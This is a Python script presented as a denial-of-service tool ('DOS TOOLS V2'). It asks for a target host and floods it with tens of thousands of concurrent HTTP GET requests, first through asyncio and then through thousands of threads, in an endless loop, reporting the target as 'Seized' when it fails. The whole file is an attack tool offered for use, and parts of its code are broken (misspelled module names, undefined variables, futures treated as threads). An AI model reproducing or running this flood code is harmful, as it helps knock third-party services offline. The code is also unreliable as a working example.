import time
import requests
import threading
import socket 
import asyncio
import aiohttp
import colorama 
import random
from colorama import Fore
from colorama import Style
from fake_useragent import UserAgent

colorama.init()

# update target
def banner():
	print(Fore.RED + ''' 
.▄▄ ·  ▄· ▄▌ ▐ ▄  ▄▄·     .▄▄ ·        ▄▄· ▄ •▄ ▄▄▄ .▄▄▄▄▄
▐█ ▀. ▐█▪██▌•█▌▐█▐█ ▌▪    ▐█ ▀. ▪     ▐█ ▌▪█▌▄▌▪▀▄.▀·•██  
▄▀▀▀█▄▐█▌▐█▪▐█▐▐▌██ ▄▄    ▄▀▀▀█▄ ▄█▀▄ ██ ▄▄▐▀▀▄·▐▀▀▪▄ ▐█.▪
▐█▄▪▐█ ▐█▀·.██▐█▌▐███▌    ▐█▄▪▐█▐█▌.▐▌▐███▌▐█.█▌▐█▄▄▌ ▐█▌·
 ▀▀▀▀   ▀ • ▀▀ █▪·▀▀▀      ▀▀▀▀  ▀█▄▀▪·▀▀▀ ·▀  ▀ ▀▀▀  ▀▀▀ 
       ...:::[ ASYNC SOCKET , DOS TOOLS V2 ]:::...
       ...:::[ Copyright BY Chiens Adams   ]:::... ''' + Style.RESET_ALL)
	print("")

banner()

url = input("Target : ")

user_agents = [
	UserAgent().chrome,
	UserAgent().firefox,
	UserAgent().safari,

]

random_user_agent = {
	"User-Agent": random.choice(user_agents)
}

headers = {
	"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
	"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
	"User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
	"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0",
	"User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko",
	"User-Agent": "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
	"User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
}

# get IP Address 
get_ip_address = socket.gethostbyname(url)
time.sleep(3)
print("")
print(Fore.GREEN + "[+] The Target As : {}".format(get_ip_address))
print("")
time.sleep(1)
print(Fore.RED + "[!] Attacking Target On 5 Secount ")
print("")

run = True
while run:
	async def send_target(session):
		async with session.get("http://" + url, headers=headers) as response:
	
			if response.status == 200:
				print(Fore.GREEN + f'[+] response finished -> {get_ip_address}: Request {response.status}')
			else:
				print(Fore.RED + f'[!] Target Seized -> {get_ip_address}: Request {response.status}')


	async def send_request(session):
		async with session.get("http://" + url, headers=headers) as response:
		
			if response.status == 200:
				print(Fore.GREEN + f'[+] response finished -> {get_ip_address}: Request {response.status}')
			else:
				print(Fore.RED + f'[!] Target Seized -> {get_ip_address}: Request {response.status}')


	async def main():
		num_socket = 10000
		num_socket2 = 10000
		socket_bot = []
		socket_bot2 = []

		async with aiohttp.ClientSession() as session:
			for i in range(num_socket):
				sock_random = asyncio.ensure_future(send_target(session))
				client_random = asyncio.ensure_future(send_request(session))
				socket_bot.append(sock_random)
				socket_bot2.append(client_random)

			await asyncio.gather(*socket_bot)
			await asyncio.gather(*socket_bot2)
			sock_random.start()
			client_random.start()

		async with aiohttp.ClientSession() as session:
			for a in range(num_socket2):
				sock_random = asyncio.ensure_future(send_target(session))
				client_random = asyncio.ensure_future(send_request(session))
				socket_bot.append(sock_random)
				socket_bot2.append(client_random)

			await asyncio.gather(*socket_bot)
			await asyncio.gather(*socket_bot2)
			sock_random.start()
			client_random.start()

	if __name__ == '__main__':
		loop = asyncio.get_event_loop()
		loop.run_until_complete(main())


	def send_socket(url):
		num_socket_bot += 1000
		response = requets.get(url)
		print(f'[{num_socket}] response done to {url}: {response.status}')

	if __name__ == '__main__':
		random_bot = 10000

		num_threads = []

		for x in range(random_bot):
			bot = threading.Thread(target=send_socket, args=(url))
			num_threads.append(bot)
			bot.start()

		for bot in num_threads:
			bot.start()


	def bot_client(url):
		response = requets.get(url)
		print(f'[{num_socket}] response done to {url}: {response.status}')

	if __name__ == '__main__':
		num_client = 10000
		threads = []

		for y in range(num_client):
			client_bot = threading.Thread(target=bot_client, args=(url))
			threads.append(tasks * num_threads * socket_bot)

			client_bot.start()

			for client_bot in threads:
				client_bot.start()
